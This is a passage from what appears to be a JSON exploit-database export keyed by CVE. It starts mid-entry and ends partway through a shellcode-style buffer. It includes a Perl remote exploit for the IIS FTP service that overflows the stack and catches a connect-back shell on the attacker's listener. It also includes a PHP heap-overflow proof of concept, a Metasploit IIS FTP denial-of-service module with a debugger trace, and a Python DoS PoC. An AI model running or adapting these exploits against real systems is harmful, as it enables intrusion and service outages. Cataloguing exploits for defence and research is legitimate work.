1) { \r\nprint \"usage: iiz5.pl <target> <your local ip>\\n\"; \r\nexit(0); \r\n} \r\nsrand(time()); \r\n$port = int(rand(31337-1022)) + 1025; \r\n$locip = $ARGV[1]; \r\n$locip =~ s/\\./,/gi; \r\nif (fork()) { \r\n$sock = IO::Socket::INET->new(PeerAddr => $ARGV[0], \r\n                              PeerPort => '21', \r\n                              Proto    => 'tcp'); \r\n$patch = \"\\x7E\\xF1\\xFA\\x7F\"; \r\n#$retaddr = \"ZZZZ\"; \r\n$retaddr = \"\\x9B\\xB1\\xF4\\x77\"; # JMP ESP univ on 2 win2k platforms \r\n$v = \"KSEXY\" . $sc . \"V\" x (500-length($sc)-5); \r\n# top address of stack frame where shellcode resides, is hardcoded inside this block \r\n$findsc=\"\\xB8\\x55\\x55\\x52\\x55\\x35\\x55\\x55\\x55\\x55\\x40\\x81\\x38\\x53\" \r\n   .\"\\x45\\x58\\x59\\x75\\xF7\\x40\\x40\\x40\\x40\\xFF\\xFF\\xE0\"; \r\n# attack buffer \r\n$c = $findsc . \"C\" . ($patch x (76/4)) . $patch.$patch. \r\n   ($patch x (52/4)) .$patch.\"EEEE$retaddr\".$patch. \r\n   \"HHHHIIII\". \r\n$patch.\"JKKK\".\"\\xE9\\x63\\xFE\\xFF\\xFF\\xFF\\xFF\".\"NNNN\"; \r\n$x = <$sock>; \r\nprint $x;                             \r\nprint $sock \"USER anonymous\\r\\n\"; \r\n$x = <$sock>; \r\nprint $x; \r\nprint $sock \"PASS anonymous\\r\\n\"; \r\n$x = <$sock>; \r\nprint $x; \r\nprint $sock \"MKD w00t$port\\r\\n\"; \r\n$x = <$sock>; \r\nprint $x; \r\nprint $sock \"SITE $v\\r\\n\"; # We store shellcode in memory of process (stack) \r\n$x = <$sock>; \r\nprint $x; \r\nprint $sock \"SITE $v\\r\\n\"; \r\n$x = <$sock>; \r\nprint $x; \r\nprint $sock \"SITE $v\\r\\n\"; \r\n$x = <$sock>;\r\nprint $x; \r\nprint $sock \"SITE $v\\r\\n\"; \r\n$x = <$sock>; \r\nprint $x; \r\nprint $sock \"SITE $v\\r\\n\"; \r\n$x = <$sock>; \r\nprint $x; \r\nprint $sock \"CWD w00t$port\\r\\n\"; \r\n$x = <$sock>; \r\nprint $x; \r\nprint $sock \"MKD CCC\". \"$c\\r\\n\"; \r\n$x = <$sock>; \r\nprint $x; \r\nprint $sock \"PORT $locip,\" . int($port / 256) . \",\" . int($port % 256) . \"\\r\\n\"; \r\n$x = <$sock>; \r\nprint $x; \r\n# TRIGGER \r\nprint $sock \"NLST $c*/../C*/\\r\\n\"; \r\n$x = <$sock>; \r\nprint $x; \r\nwhile (1) {} \r\n} else { \r\nmy $servsock = IO::Socket::INET->new(LocalAddr => \"0.0.0.0\", LocalPort => $port, Proto => 'tcp', Listen => 1); \r\ndie \"Could not create socket: $!\\n\" unless $servsock; \r\nmy $new_sock = $servsock->accept(); \r\nwhile(<$new_sock>) { \r\nprint $_; \r\n} \r\nclose($servsock); \r\n} \r\n#Cheerio, \r\n# \r\n#Kingcope\r\n\r\n# milw0rm.com [2009-08-31]\r\n",
            "cvss": {
                "score": 9.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:COMPLETE/I:COMPLETE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:9541"
        }
    ],
    "CVE-2017-16642": [
        {
            "bulletinFamily": "exploit",
            "description": "Exploit for php platform in category local exploits",
            "modified": "2017-11-15T00:00:00",
            "published": "2017-11-15T00:00:00",
            "href": "https://0day.today/exploit/description/29001",
            "id": "1337DAY-ID-29001",
            "type": "zdt",
            "title": "PHP 7.1.8 - Heap-Based Buffer Overflow Vulnerability",
            "sourceData": "",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:NONE/A:NONE/"
            },
            "vhref": "https://vulners.com/zdt/1337DAY-ID-29001"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2017-11-09T00:00:00",
            "published": "2017-11-09T00:00:00",
            "id": "EDB-ID:43133",
            "href": "https://www.exploit-db.com/exploits/43133",
            "type": "exploitdb",
            "title": "PHP 7.1.8 - Heap Buffer Overflow",
            "sourceData": "Description:\r\n------------\r\nA heap out-of-bound read vulnerability in timelib_meridian() can be triggered via wddx_deserialize() or other vectors that call into this function on untrusted inputs.\r\n\r\n$ ~/php-7.1.8/sapi/cli/php --version\r\nPHP 7.1.8 (cli) (built: Aug  9 2017 21:42:13) ( NTS )\r\nCopyright (c) 1997-2017 The PHP Group\r\nZend Engine v3.1.0, Copyright (c) 1998-2017 Zend Technologies\r\n\r\nConfiguration:\r\nCC=\"`which gcc`\" CFLAGS=\"-O0 -g -fsanitize=address\" ./configure --disable-shared --enable-wddx\r\n\r\nCredit:\r\nWei Lei and Liu Yang of Nanyang Technological University\r\n\r\nTest script:\r\n---------------\r\n$ cat wddx.php \r\n*/\r\n<?php\r\n$argc = $_SERVER['argc'];\r\n$argv = $_SERVER['argv'];\r\n\r\n$dir_str = dirname(__FILE__);\r\n\r\n$file_str = ($dir_str).\"/\".$argv[1];\r\n\r\nif (!extension_loaded('wddx')) print \"wddx not loaded.\\n\";\r\n\r\n$wddx_str = file_get_contents($file_str);\r\nprint strlen($wddx_str) . \" bytes read.\\n\";\r\n\r\nvar_dump(wddx_deserialize($wddx_str));\r\n?>\r\n\r\n/*\r\n$ cat repro2.wddx \r\n<?xml version='1.0'?>\r\n<!DOCTYPE wddxPacket SYSTEM 'wddx_0100.dtd'>\r\n<wddxPacket version='1.0'>\r\n<header/>\r\n\t<data>\r\n        \t<struct>\r\n                    <var name='aDateTime'>\r\n                         <dateTime>frONt of 0 0</dateTime>\r\n                     </var>\r\n                </struct>\r\n\t</data>\r\n</wddxPacket>\r\n\r\n/*\r\nExpected result:\r\n----------------\r\nNO CRASH\r\n\r\nActual result:\r\n--------------\r\n$ ~/php-7.1.8/sapi/cli/php wddx.php repro2.wddx \r\n309 bytes read.\r\n=================================================================\r\n==13788== ERROR: AddressSanitizer: heap-buffer-overflow on address 0xb57057fc at pc 0x809b622 bp 0xbf9d09d8 sp 0xbf9d09cc\r\nREAD of size 1 at 0xb57057fc thread T0\r\n    #0 0x809b621 in timelib_meridian /home/weilei/php-7.1.8/ext/date/lib/parse_date.c:410\r\n    #1 0x80e0293 in scan /home/weilei/php-7.1.8/ext/date/lib/parse_date.c:18228\r\n    #2 0x80f0710 in timelib_strtotime /home/weilei/php-7.1.8/ext/date/lib/parse_date.c:23194\r\n    #3 0x806afed in php_parse_date /home/weilei/php-7.1.8/ext/date/php_date.c:1455\r\n    #4 0x8a2c588 in php_wddx_process_data /home/weilei/php-7.1.8/ext/wddx/wddx.c:1071\r\n    #5 0x8a40f7b in _cdata_handler /home/weilei/php-7.1.8/ext/xml/compat.c:265\r\n    #6 0xb5cc06b5 in xmlParseCharData__internal_alias /home/weilei/libxml2/parser.c:4597\r\n    #7 0xb5d129be in xmlParseTryOrFinish /home/weilei/libxml2/parser.c:11715\r\n    #8 0xb5d1a462 in xmlParseChunk__internal_alias /home/weilei/libxml2/parser.c:12454\r\n    #9 0x8a42de6 in php_XML_Parse /home/weilei/php-7.1.8/ext/xml/compat.c:600\r\n    #10 0x8a2c974 in php_wddx_deserialize_ex /home/weilei/php-7.1.8/ext/wddx/wddx.c:1105\r\n    #11 0x8a2f394 in zif_wddx_deserialize /home/weilei/php-7.1.8/ext/wddx/wddx.c:1323\r\n    #12 0x8ddcd0b in ZEND_DO_ICALL_SPEC_RETVAL_USED_HANDLER /home/weilei/php-7.1.8/Zend/zend_vm_execute.h:675\r\n    #13 0x8dd70df in execute_ex /home/weilei/php-7.1.8/Zend/zend_vm_execute.h:429\r\n    #14 0x8dd8845 in zend_execute /home/weilei/php-7.1.8/Zend/zend_vm_execute.h:474\r\n    #15 0x8c32247 in zend_execute_scripts /home/weilei/php-7.1.8/Zend/zend.c:1476\r\n    #16 0x8a5fbc5 in php_execute_script /home/weilei/php-7.1.8/main/main.c:2537\r\n    #17 0x90f5a70 in do_cli /home/weilei/php-7.1.8/sapi/cli/php_cli.c:993\r\n    #18 0x90f834b in main /home/weilei/php-7.1.8/sapi/cli/php_cli.c:1381\r\n    #19 0xb5ab9a82 (/lib/i386-linux-gnu/libc.so.6+0x19a82)\r\n    #20 0x8065230 in _start (/home/weilei/php-7.1.8/sapi/cli/php+0x8065230)\r\n0xb57057fc is located 0 bytes to the right of 12-byte region [0xb57057f0,0xb57057fc)\r\nallocated by thread T0 here:\r\n    #0 0xb6168854 (/usr/lib/i386-linux-gnu/libasan.so.0+0x16854)\r\n    #1 0x8b73387 in __zend_malloc /home/weilei/php-7.1.8/Zend/zend_alloc.c:2820\r\n    #2 0x8b704a6 in _emalloc /home/weilei/php-7.1.8/Zend/zend_alloc.c:2413\r\n    #3 0x8b710f1 in _safe_emalloc /home/weilei/php-7.1.8/Zend/zend_alloc.c:2472\r\n    #4 0x8b7164c in _ecalloc /home/weilei/php-7.1.8/Zend/zend_alloc.c:2495\r\n    #5 0x809bd8a in timelib_string /home/weilei/php-7.1.8/ext/date/lib/parse_date.c:460\r\n    #6 0x80dfcbb in scan /home/weilei/php-7.1.8/ext/date/lib/parse_date.c:18215\r\n    #7 0x80f0710 in timelib_strtotime /home/weilei/php-7.1.8/ext/date/lib/parse_date.c:23194\r\n    #8 0x806afed in php_parse_date /home/weilei/php-7.1.8/ext/date/php_date.c:1455\r\n    #9 0x8a2c588 in php_wddx_process_data /home/weilei/php-7.1.8/ext/wddx/wddx.c:1071\r\n    #10 0x8a40f7b in _cdata_handler /home/weilei/php-7.1.8/ext/xml/compat.c:265\r\n    #11 0xb5cc06b5 in xmlParseCharData__internal_alias /home/weilei/libxml2/parser.c:4597\r\n    #12 0xb5d129be in xmlParseTryOrFinish /home/weilei/libxml2/parser.c:11715\r\n    #13 0xb5d1a462 in xmlParseChunk__internal_alias /home/weilei/libxml2/parser.c:12454\r\n    #14 0x8a42de6 in php_XML_Parse /home/weilei/php-7.1.8/ext/xml/compat.c:600\r\n    #15 0x8a2c974 in php_wddx_deserialize_ex /home/weilei/php-7.1.8/ext/wddx/wddx.c:1105\r\n    #16 0x8a2f394 in zif_wddx_deserialize /home/weilei/php-7.1.8/ext/wddx/wddx.c:1323\r\n    #17 0x8ddcd0b in ZEND_DO_ICALL_SPEC_RETVAL_USED_HANDLER /home/weilei/php-7.1.8/Zend/zend_vm_execute.h:675\r\n    #18 0x8dd70df in execute_ex /home/weilei/php-7.1.8/Zend/zend_vm_execute.h:429\r\n    #19 0x8dd8845 in zend_execute /home/weilei/php-7.1.8/Zend/zend_vm_execute.h:474\r\n    #20 0x8c32247 in zend_execute_scripts /home/weilei/php-7.1.8/Zend/zend.c:1476\r\n    #21 0x8a5fbc5 in php_execute_script /home/weilei/php-7.1.8/main/main.c:2537\r\n    #22 0x90f5a70 in do_cli /home/weilei/php-7.1.8/sapi/cli/php_cli.c:993\r\n    #23 0x90f834b in main /home/weilei/php-7.1.8/sapi/cli/php_cli.c:1381\r\n    #24 0xb5ab9a82 (/lib/i386-linux-gnu/libc.so.6+0x19a82)\r\nSUMMARY: AddressSanitizer: heap-buffer-overflow /home/weilei/php-7.1.8/ext/date/lib/parse_date.c:410 timelib_meridian\r\nShadow bytes around the buggy address:\r\n  0x36ae0aa0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\n  0x36ae0ab0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\n  0x36ae0ac0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\n  0x36ae0ad0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\n  0x36ae0ae0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\n=>0x36ae0af0: fa fa fa fa fa fa fa fa fa fa fd fa fa fa 00[04]\r\n  0x36ae0b00:fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\n  0x36ae0b10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\n  0x36ae0b20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\n  0x36ae0b30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\n  0x36ae0b40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\nShadow byte legend (one shadow byte represents 8 application bytes):\r\n  Addressable:           00\r\n  Partially addressable: 01 02 03 04 05 06 07 \r\n  Heap left redzone:     fa\r\n  Heap righ redzone:     fb\r\n  Freed Heap region:     fd\r\n  Stack left redzone:    f1\r\n  Stack mid redzone:     f2\r\n  Stack right redzone:   f3\r\n  Stack partial redzone: f4\r\n  Stack after return:    f5\r\n  Stack use after scope: f8\r\n  Global redzone:        f9\r\n  Global init order:     f6\r\n  Poisoned by user:      f7\r\n  ASan internal:         fe\r\n==13788== ABORTING\r\nAborted\r\n*/",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:NONE/A:NONE/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:43133"
        }
    ],
    "CVE-2010-2730": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 43138\r\nCVE ID: CVE-2010-2730\r\n\r\nMicrosoft Internet\u4fe1\u606f\u670d\u52a1\uff08IIS\uff09\u662fMicrosoft Windows\u81ea\u5e26\u7684\u4e00\u4e2a\u7f51\u7edc\u4fe1\u606f\u670d\u52a1\u5668\uff0c\u5176\u4e2d\u5305\u542bHTTP\u670d\u52a1\u529f\u80fd\u3002\r\n\r\n\u5bf9\u4e8e\u542f\u7528\u4e86FastCGI\u529f\u80fd\u7684IIS\u670d\u52a1\u5668\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u63d0\u4ea4\u7279\u5236\u7684HTTP\u8bf7\u6c42\u89e6\u53d1\u7f13\u51b2\u533a\u6ea2\u51fa\uff0c\u5bfc\u81f4\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002\n\nMicrosoft IIS 7.5\n\u4e34\u65f6\u89e3\u51b3\u65b9\u6cd5\uff1a\r\n\r\n* \u7981\u7528FastCGI\u3002\r\n\r\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nMicrosoft\r\n---------\r\nMicrosoft\u5df2\u7ecf\u4e3a\u6b64\u53d1\u5e03\u4e86\u4e00\u4e2a\u5b89\u5168\u516c\u544a\uff08MS10-065\uff09\u4ee5\u53ca\u76f8\u5e94\u8865\u4e01:\r\nMS10-065\uff1aVulnerabilities in Microsoft Internet Information Services (IIS) Could Allow Remote Code Execution (2267960)\r\n\u94fe\u63a5\uff1ahttp://www.microsoft.com/technet/security/bulletin/MS10-065.mspx?pf=true",
            "modified": "2010-09-17T00:00:00",
            "published": "2010-09-17T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-20122",
            "id": "SSV:20122",
            "type": "seebug",
            "title": "Microsoft IIS FastCGI\u8bf7\u6c42\u5934\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e\uff08MS10-065\uff09",
            "sourceData": "",
            "cvss": {
                "score": 9.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:COMPLETE/I:COMPLETE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:20122"
        }
    ],
    "CVE-2010-3972": [
        {
            "bulletinFamily": "exploit",
            "description": "This module triggers a heap overflow when processing a specially crafted FTP request containing Telnet IAC (0xff) bytes. When constructing the response, the Microsoft IIS FTP Service overflows the heap buffer with 0xff bytes. This issue can be triggered pre-auth and may in fact be exploitable for remote code execution.\n",
            "modified": "2017-08-25T01:38:44",
            "published": "2010-12-31T18:32:55",
            "id": "MSF:AUXILIARY/DOS/WINDOWS/FTP/IIS75_FTPD_IAC_BOF",
            "href": "",
            "type": "metasploit",
            "title": "Microsoft IIS FTP Server Encoded Response Overflow Trigger",
            "sourceData": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft IIS FTP Server Encoded Response Overflow Trigger',\n      'Description'    => %q{\n          This module triggers a heap overflow when processing a specially crafted\n        FTP request containing Telnet IAC (0xff) bytes. When constructing the response,\n        the Microsoft IIS FTP Service overflows the heap buffer with 0xff bytes.\n\n        This issue can be triggered pre-auth and may in fact be exploitable for\n        remote code execution.\n      },\n      'Author'         =>\n        [\n          'Matthew Bergin',  # Original discovery/disclosure\n          'jduck'            # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2010-3972' ],\n          [ 'OSVDB', '70167' ],\n          [ 'BID', '45542' ],\n          [ 'MSB', 'MS11-004' ],\n          [ 'EDB', '15803' ],\n          [ 'URL', 'http://blogs.technet.com/b/srd/archive/2010/12/22/assessing-an-iis-ftp-7-5-unauthenticated-denial-of-service-vulnerability.aspx' ]\n        ],\n      'DisclosureDate' => 'Dec 21 2010'))\n\n    register_options(\n      [\n        Opt::RPORT(21)\n      ])\n  end\n\n\n  def run\n    connect\n\n    banner = sock.get_once(-1, 10)\n    print_status(\"banner: #{banner.strip}\")\n\n    buf = Rex::Text.pattern_create(1024)\n\n    # the 0xff's must be doubled, the server will un-and-re-double them.\n    ffs = \"\\xff\" * (0x7e*2)\n\n    # Continuing after the first exception sometimes leads to this being derefenced.\n    buf[0,3] = [0xdeadbe00].pack('V')[1,3]\n\n    buf[4,ffs.length] = ffs\n    buf << \"\\r\\n\"\n\n    sock.put(buf)\n\n    disconnect\n  rescue ::Rex::ConnectionError\n  end\nend\n\n=begin\n\nThis transcript is from a vulnerable Win7 machine:\n\nProcessing initial command '$<script.wdbg'\n0:012> $<script.wdbg\n0:012> bp ftpsvc+3f360 \".printf \\\"buf @ 0x%x, len: 0x%x (end: 0x%x)\\\\n\\\", eax, ecx, (eax+ecx);g\"\n0:012> bp ftpsvc+3f382 \".printf \\\"extra len: 0x%x\\\\n\\\", edi;g\"\n0:012> bp ftpsvc+3f395 \".printf \\\"(0x%x+0x%x) 0x%x > (0x%x-0x%x) 0x%x ??\\\\n\\\", ecx, edi, ebx, poi(esi+14), poi(esi+8), edx;g\"\n0:012> bp ftpsvc+3f397\n0:012> bp ftpsvc+3f39f \"r @$t0 = ecx;g\"\n0:012> bp ftpsvc+3f3a4 \".printf \\\"allocated 0x%x bytes at 0x%x (end: 0x%x)\\\\n\\\", @$t0, eax, (eax+@$t0);g\"\n0:012> *bp ftpsvc+3f3c0 \".printf \\\"writing 0xff to 0x%x\\\\n\\\", eax;g\"\n0:012> *bp ftpsvc+3f3c6 \".printf \\\"writing 0x%x to 0x%x\\\\n\\\", (edx & 0xff), eax;g\"\n0:012> g\nbuf @ 0x97f81c, len: 0x1b (end: 0x97f837)\nextra len: 0x0\nbuf @ 0x3e4ca0, len: 0x3a4 (end: 0x3e5044)\nextra len: 0x7e\n(0x3a4+0x7e) 0x422 > (0x422-0x0) 0x422 ??\nBreakpoint 3 hit\neax=003e4ca0 ebx=00000422 ecx=000003a4 edx=00000422 esi=00dcfaf8 edi=0000007e\neip=6c63f397 esp=00dcfaac ebp=00dcfac0 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nftpsvc!TELNET_STREAM_CONTEXT::OnSendData+0x49:\n6c63f397 8b7df8          mov     edi,dword ptr [ebp-8] ss:0023:00dcfab8=00000000\n0:007> g\n(2f8.a40): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=003e50d0 ebx=00000000 ecx=ffffffff edx=003e4898 esi=003e4890 edi=002f0000\neip=778f30d7 esp=00dcf990 ebp=00dcfa70 iopl=0         nv up ei ng nz ac pe cy\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010297\nntdll!RtlpFreeHeap+0x4d6:\n778f30d7 8b19            mov     ebx,dword ptr [ecx]  ds:0023:ffffffff=????????\n0:007> g\n(2f8.a40): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=003e4898 ebx=003e4c98 ecx=deadbe27 edx=ffffff41 esi=003e4890 edi=002f0000\neip=778f6030 esp=00dcf950 ebp=00dcf978 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\nntdll!RtlpCoalesceFreeBlocks+0x268:\n778f6030 8b4904          mov     ecx,dword ptr [ecx+4] ds:0023:deadbe2b=????????\n\n=end\n",
            "cvss": {
                "score": 10.0,
                "vector": "AV:N/AC:L/Au:N/C:C/I:C/A:C"
            },
            "vhref": "https://vulners.com/metasploit/MSF:AUXILIARY/DOS/WINDOWS/FTP/IIS75_FTPD_IAC_BOF"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Windows 7 IIS7.5 FTPSVC UNAUTH'D Remote DoS PoC. CVE-2010-3972. Dos exploit for windows platform",
            "modified": "2010-12-21T00:00:00",
            "published": "2010-12-21T00:00:00",
            "id": "EDB-ID:15803",
            "href": "https://www.exploit-db.com/exploits/15803/",
            "type": "exploitdb",
            "title": "Windows 7 IIS7.5 FTPSVC UNAUTH'D Remote DoS PoC",
            "sourceData": "\t\r\nimport socket, sys\r\nprint \"\\n\" \r\nprint \"----------------------------------------------------------------\"\r\nprint \"|      Windows 7 IIS7.5 FTPSVC UNAUTH'D REMOTE DOS POC          |\"\r\nprint \"|      Matthew Bergin, Bergin Penetration Testing               |\"\r\nprint \"|       Win7 Ultimate v6.1 build 7600, IIS 7.5.7600.16385                     |\"\r\nprint \"----------------------------------------------------------------\"\r\nprint \"\\n\"\r\nbuf=(\"\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\"\r\n\"\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\"\r\n\"\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\"\r\n\"\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\"\r\n\"\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\"\r\n\"\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\"\r\n\"\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\"\r\n\"\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\"\r\n\"\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\"\r\n\"\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\"\r\n\"\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\"\r\n\"\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\"\r\n\"\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\"\r\n\"\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\"\r\n\"\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\"\r\n\"\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\"\r\n\"\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\"\r\n\"\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\"\r\n\"\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\"\r\n\"\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\"\r\n\"\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\"\r\n\"\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\"\r\n\"\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\"\r\n\"\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\"\r\n\"\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\"\r\n\"\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\"\r\n\"\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\"\r\n\"\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\"\r\n\"\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\"\r\n\"\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\"\r\n\"\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\"\r\n\"\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\"\r\n\"\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\"\r\n\"\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\"\r\n\"\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\"\r\n\"\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\"\r\n\"\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\"\r\n\"\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\"\r\n\"\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\"\r\n\"\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\"\r\n\"\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\"\r\n\"\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\"\r\n\"\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\"\r\n\"\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\"\r\n\"\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\"\r\n\"\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\"\r\n\"\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\"\r\n\"\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\"\r\n\"\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\"\r\n\"\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\\xb0\\xef\\x83\"\r\n\"\\xb0\\xef\\x